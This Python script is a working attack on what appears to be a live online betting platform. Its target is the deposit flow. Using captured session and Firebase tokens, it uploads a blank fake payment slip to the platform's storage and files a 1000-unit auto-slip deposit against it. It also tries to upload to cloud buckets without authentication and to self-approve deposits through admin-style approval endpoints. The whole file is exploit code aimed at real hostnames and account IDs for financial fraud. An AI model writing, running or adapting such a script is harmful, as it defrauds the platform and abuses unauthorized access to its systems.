#!/usr/bin/env python3
"""probe_slip_upload.py — Upload slip to Firebase Storage → auto-slip deposit.

   HYPOTHESIS: auto-slip reads slip_image_url from Firebase Storage (vak88.appspot.com).
   If Storage rules allow player writes, we can plant a slip image and the deposit
   auto-approval bot will read it, validate amount, and credit the balance.

   Also: probe GCS vak88 bucket directly + check deposit list endpoints.
"""
import json, pathlib, requests, uuid, time, base64, struct, zlib

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
RTDB  = "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app"

AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT   = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
_new  = pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt")
FB_TOKEN = (_new.read_text().strip() if _new.exists() and _new.stat().st_size > 100
            else pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip())
parts = FB_TOKEN.split(".")
pad   = parts[1] + "=" * (-len(parts[1]) % 4)
p     = json.loads(base64.urlsafe_b64decode(pad))
FB_UID = p.get("sub") or p.get("user_id", "")

HDR = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json",
       "Cookie": f"AWSALB={AWSALB}"}
BANK_INFO_ID   = "18a9502b-94ae-4188-8841-094be8b3b974"
DEPOSIT_ACC_ID = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

# ── Minimal valid PNG (1x1 white pixel) ──────────────────────────────────────
def make_png():
    def chunk(tag, data):
        c = zlib.crc32(tag + data) & 0xffffffff
        return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", c)
    sig  = b'\x89PNG\r\n\x1a\n'
    ihdr = chunk(b'IHDR', struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    raw  = b'\x00\xff\xff\xff'
    idat = chunk(b'IDAT', zlib.compress(raw))
    iend = chunk(b'IEND', b'')
    return sig + ihdr + idat + iend

SLIP_PNG = make_png()

# ── 1. Firebase Storage upload attempts ──────────────────────────────────────
print("=== Firebase Storage upload ===")
BUCKET = "vak88.appspot.com"
slip_id = str(uuid.uuid4())

# Common slip paths platforms use
paths = [
    f"slips/{slip_id}.png",
    f"deposits/{slip_id}.png",
    f"slip/{slip_id}.png",
    f"upload/slips/{slip_id}.png",
    f"users/{FB_UID}/slips/{slip_id}.png",
    f"members/{FB_UID}/{slip_id}.png",
    f"{slip_id}.png",
    f"{slip_id}.jfif",
]

uploaded_path = None
for path in paths:
    encoded = requests.utils.quote(path, safe="")
    url = f"https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{encoded}?uploadType=media"
    r = requests.post(url,
                      headers={"Authorization": f"Firebase {FB_TOKEN}",
                               "Content-Type": "image/png"},
                      data=SLIP_PNG, timeout=12)
    if r.status_code == 200:
        print(f"  [!!!] UPLOAD SUCCESS: {path}")
        print(f"        {r.text[:300]}")
        uploaded_path = path
        break
    else:
        print(f"  {path}: HTTP {r.status_code}")

# ── 2. Try GCS direct upload (no auth) ──────────────────────────────────────
print("\n=== GCS bucket direct upload ===")
for bucket in ["vak88", "vak88-slips", f"{TID}-slips"]:
    r = requests.post(
        f"https://storage.googleapis.com/upload/storage/v1/b/{bucket}/o?uploadType=media&name=slips/{slip_id}.png",
        headers={"Content-Type": "image/png"},
        data=SLIP_PNG, timeout=10
    )
    if r.status_code not in (401, 403):
        print(f"  [!!!] gs://{bucket}/slips/: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  gs://{bucket}/: HTTP {r.status_code}")

# ── 3. Deposit with uploaded slip ────────────────────────────────────────────
if uploaded_path:
    print(f"\n=== Deposit with uploaded slip ===")
    slip_url = f"https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{requests.utils.quote(uploaded_path, safe='')}?alt=media"
    dep = requests.post(f"{MGAPI}/mb/deposit-transaction",
                        headers=HDR,
                        json={"deposit_amount":              1000.0,
                              "slip_image_url":              slip_url,
                              "is_auto_slip":                True,
                              "payment_bank_information_id": BANK_INFO_ID,
                              "deposit_account_id":          DEPOSIT_ACC_ID},
                        timeout=12)
    print(f"  deposit: HTTP {dep.status_code}: {dep.text[:400]}")

# ── 4. Find correct deposit listing endpoint ─────────────────────────────────
print("\n=== Deposit listing endpoints ===")
for path in [
    "/mb/deposit-transaction",
    "/mb/deposit-transactions",
    "/mb/deposit",
    "/mb/deposits",
    "/mb/transaction",
    "/mb/transactions",
]:
    r = requests.get(f"{MGAPI}{path}", headers=HDR, timeout=8)
    if r.status_code == 200:
        print(f"  [!!!] GET {path}: HTTP 200: {r.text[:400]}")
    elif r.status_code not in (404, 405):
        print(f"  GET {path}: HTTP {r.status_code}: {r.text[:100]}")

# ── 5. Try deposit approval via pbapi ────────────────────────────────────────
print("\n=== pbapi deposit approval endpoints ===")
dep_ids = [
    "a3929435-0589-4713-8437-9489af89dc51",  # from probe_signurl
    "b0783e2e-1051-453f-800c-b83f670cd93f",  # from vak_dep
]
pb_jwt = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
for dep_id in dep_ids[:1]:
    for path in [
        f"/pb/deposit/{dep_id}/approve",
        f"/pb/deposit-transaction/{dep_id}",
        f"/user/deposit/{dep_id}/approve",
        f"/pb/user/deposit/{dep_id}/approve",
    ]:
        r = requests.post(f"https://{TID}pbapi.asdgapicenterssdo.com{path}",
                          headers={"Authorization": f"Bearer {pb_jwt}",
                                   "Content-Type": "application/json"},
                          json={"status": "approved"}, timeout=8)
        if r.status_code not in (404, 405):
            print(f"  POST {path}: HTTP {r.status_code}: {r.text[:200]}")

# ── 6. RTDB: check deposit_transaction node for pending records ──────────────
print("\n=== RTDB deposit_transaction node ===")
r = requests.get(f"{RTDB}/users/{FB_UID}/deposit_transaction.json?auth={FB_TOKEN}", timeout=10)
print(f"  HTTP {r.status_code}: {str(r.json() or {})[:400]}")

# ── 7. Wallet ─────────────────────────────────────────────────────────────────
print(f"\nwallet: {wallet()}")
print("=== DONE ===")
